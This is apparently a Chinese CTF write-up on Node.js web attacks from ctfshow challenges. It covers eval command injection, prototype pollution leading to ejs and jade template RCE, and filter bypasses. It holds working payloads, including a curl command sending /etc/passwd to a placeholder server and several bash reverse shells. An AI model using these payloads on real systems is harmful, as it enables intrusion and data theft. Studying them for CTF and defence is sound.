## Nodejs

##  Nodejs的文档

```
http://nodejs.cn/learn
```

##  弱类型

###  大小写比较

跟php比较相似

```
console.log(1=='1'); //true
console.log(1>'2'); //false
console.log('1'<'2'); //true
console.log(111>'3'); //true
console.log("ad">"v") //false
console.log('asd'>1); //false
```

**总结**：数字与字符串比较时：会优先将纯数字型字符串转为数字之后再进行比较；

字符串与字符串比较时：会将字符串的第一个字符转为ASCII码之后再进行比较；

而非数字型字符串与任何数字进行比较都是false。

**数组的比较：**

```
console.log([]==[]); //false
console.log([]>[]); //false
console.log([]>[]); //false
console.log([6,2]>[5]); //true
console.log([100,2]<'test'); //true
console.log([1,2]<'2');  //true
console.log([11,16]<"10"); //false
```

**总结：**空数组之间比较永远为false，

数组与非数值型字符串比较，数组永远小于非数值型字符串；

数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较。

还有一些比较特别的相等比较：

```
console.log(null==undefined) // 输出：true
console.log(null===undefined) // 输出：false
console.log(NaN==NaN)  // 输出：false
console.log(NaN===NaN)  // 输出：false
```

##  js大小写绕过

[大小写特性](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)(P神)

### ctfshow web334

看zip中的源码

```php
var express = require('express');
var router = express.Router();
var users = require('../modules/user').items;
 
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
};

/* GET home page. */
router.post('/', function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var sess = req.session;
  var user = findUser(req.body.username, req.body.password);
 
  if(user){
    req.session.regenerate(function(err) {
      if(err){
        return res.json({ret_code: 2, ret_msg: '登录失败'});        
      }
       
      req.session.loginUser = user.username;
      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
    });
  }else{
    res.json({ret_code: 1, ret_msg: '账号或密码错误'});
  }  
  
});

module.exports = router;
```

其中

```php
toUpperCase()是javascript中将小写转换成大写的函数。
toLowerCase()是javascript中将大写转换成小写的函数
除此之外
在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。
在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。

```

所以直接payload（小写绕过）

```
输入：ctfshow和123456
```

##  ES6模板字符串

我们可以使用反引号替代括号执行函数，如:

```
alert`test!!`
```

可以用反引号替代单引号双引号，可以在反引号内插入变量，如：

```
var fruit = `apple`;
console.log`i like ${fruit} very much`;
```

事实上，模板字符串是将我们的字符串作为参数传入函数中，而该参数是一个数组，该数组会在遇到`${}`时将字符串进行分割，具体为下：

```
["i like ", " very much", raw: Array(2)]
0: "i like "
1: " very much"
length: 2
raw: (2) ["i like ", " very much"]
__proto__: Array(0)
```

所以有时使用反引号执行会失败，所以如下是无法执行的：

```
eval`alert(2)`
```

## 命令执行

### ctfshow web335

F12中有个`eval`，想到了通过eval来命令执行

eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。



在Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令在eval函数的参数中可以构造`require('child_process').exec('');`来进行调用。

例如，

弹计算器:

```
/eval?q=require('child_process').exec('calc');
```

读取文件

```
/eval?q=require('child_process').exec('curl -F "x=`cat /etc/passwd`" http://vps');;
这个是将执行的命令，curl到自己的服务器上，显示出来。
```

反弹shell

```
/eval?q=require('child_process').exec('echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash');

YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i >& /dev/tcp/127.0.0.1/3333 0>&1 BASE64加密后的结果，直接调用会报错。

注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)
```

所以这个题的payload

这个地方的`execSync`和`exec`一样的，应该只是版本不同，就相当于`readfile`和`readfileSync`是相同的

```
/?eval=require('child_process').execSync('ls').toString()
/?eval=require('child_process').execSync('cat fl00g.txt').toString()
```

还可以利用`spawnSync`,跟`exec`一样的，都用于开一个子进程执行指定命令。

但是也有不同点，[可以看看这个](https://zhuanlan.zhihu.com/p/64205442)

```
require('child_process').spawnSync('ls',['./']).stdout.toString()
require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString()
```

如果require被禁用了，也可以利用这个来引入模块

```
global.process.mainModule.constructor._load('child_process').spwanSync('ls',['.']).toString()
```

**总结**

加载模板：

>require()
>
>global.process.mainModule.constructor._load()

执行命令：

>execSync()
>
>spawnSync()

其他的执行语句

```php
eval("require('child_process').exec('calc');");
setInterval(require('child_process').exec,1000,"calc");
setTimeout(require('child_process').exec,1000,"calc");
Function("global.process.mainModule.constructor._load('child_process').exec('calc')")();
```

### ctfshow web336

禁用了`exec`，所以我们可以利用`spawn`

```php
require( 'child_process' ).spawnSync( 'ls', [ '/' ] ).stdout.toString()
require( 'child_process' ).spawnSync( 'cat', [ 'f*' ] ).stdout.toString()

```

还可以利用文件操作的方式读取文件内容

```
__filename 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是模块文件的路径。
__dirname 表示当前执行脚本所在的目录。
```

```
/?eval=__filename
/?eval=require('fs').readFileSync('/app/routes/index.js','utf-8')         //过滤exec|load
/?eval=require('child_process')['exe'+'cSync']('ls').toString()           //+号绕过
```

还有这样

先利用`readdirSync`读取目录，然后`readfileSync`读取文件内容。

```
?eval=require('fs').readdirSync('.')
?eval=require('fs').readFileSync('fl001g.txt','utf-8')
```

##  数组绕过

### ctfshow web337

```js
var express = require('express');
var router = express.Router();
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }
  
});

module.exports = router;

```

就是考md5绕过

payload

```
?a[x]=1&b[x]=2
```

##  原型链污染

### 概念介绍

[关于继承和原型链的介绍](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain)

[Nodejs常见的漏洞学习和总结](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)

### ctfshow web338

看源码

```js
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
```

其中copy函数

```js
function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
```

就是一个典型的`merge类型`

直接上payload

```
{"__proto__":{"ctfshow":"36dboy"}}
```

因为原型污染，`secret`对象直接继承了Object.prototype，所以就导致了`secert.ctfshow==='36dboy'`

###  web339

login.js也变了

```js
/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow===flag){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
});
```

这儿多了个api.js

```js
var express = require('express');
var router = express.Router();
var utils = require('../utils/common');


// var query = "return global.process.mainModule.constructor._load('child_process').execSync('whoami');";
/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  res.render('api', { query: Function(query)(query)});

});
module.exports = router;
```

我们可以通过login.js的copy实现原型链污染，覆盖query的值，`let user = {}`的原型对象是`Object.prototype`

在api.js中的Function的query变量是没有的，就需要去原型链找，`Function.prototype ---> Object.prototype `,就造成原型链污染了。



非预期的payload、

ejs rce具体的来看下大佬写的文章`https://xz.aliyun.com/t/7184`

```
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/4567 0>&1\"');var __tmp2"}}
```

```
{"constructor/prototype/outputFunctionName": "a; return global.process.mainModule.constructor._load(\"child_process\").execSync(\"xxx\"); //"}
```

先将payload在login界面的post-body部分

post访问url/api就可以反弹shell了(一定要post)

![image-20220419210414069](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204192105722.png)

###  web340

不同之处

```js
var flag='flag_here';
var user = new function(){
  this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
  };
}
utils.copy(user.userinfo,req.body);
if(user.userinfo.isAdmin){
  res.end(flag);
}
```

![image-20220419210549816](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204192105933.png)

需要上跳两级才能到`object`

所有payload

```js
{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/4567 0>&1\"')"}}}
```

###  web341

预期解ejs rce
payload:

```
{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/4567 0>&1\"');var __tmp2"}}}
```

然后访问界面

###  web342，343

**jade原型链污染**

参考链接`https://xz.aliyun.com/t/7025`

payload

```js
{"__proto__":{"__proto__": {"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/810>&1\"')"}}}

{"__proto__":{"__proto__": {"type":"Code","compileDebug":1,"self":1,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );jade_debug.unshift(new jade.DebugItem(0"}}}

{"__proto__":{"__proto__": {"type":"MixinBlock","compileDebug":1,"self":1,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );//"}}}

{"__proto__":{"__proto__": {"type":"Doctype","compileDebug":1,"self":1,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );//"}}}

{"__proto__":{"__proto__": {"type":"Doctype","compileDebug":1,"self":1,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('calc');//"}}}
```



### web344

```js
router.get('/', function(req, res, next) {
 res.type('html');
 var flag = 'flag_here';
 if(req.url.match(/8c|2c|\,/ig)){
 	res.end('where is flag :)');
 }
 var query = JSON.parse(req.query.query);
 if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
 	res.end(flag);
 }else{
 	res.end('where is flag. :)');
 }

});

```

根据源码我们正常情况下需要传`?query={"name":"admin","password":"ctfshow","isVIP":true}`但是题目把逗号和他的url编码给过滤掉了，所以需要绕过。
`payload:?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}`
nodejs中会把这三部分拼接起来，为什么把ctfshow中的c编码呢，因为双引号的url编码是%22再和c连接起来就是%22c，会匹配到正则表达式。

## VM沙盒逃逸

###  知识点

[沙箱逃逸](https://github.com/Y4tacker/Web-Security/tree/main/ProgrammingLanguages/Nodejs/data/nodejs%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8)

###  CTF题目

[[GKCTF2020]EZ 三剑客](https://blog.csdn.net/rfrder/article/details/113823417)

##  参考文献

https://xz.aliyun.com/t/7184#toc-8

http://www.yongsheng.site/2021/11/16/ctfshow%20nodejs/

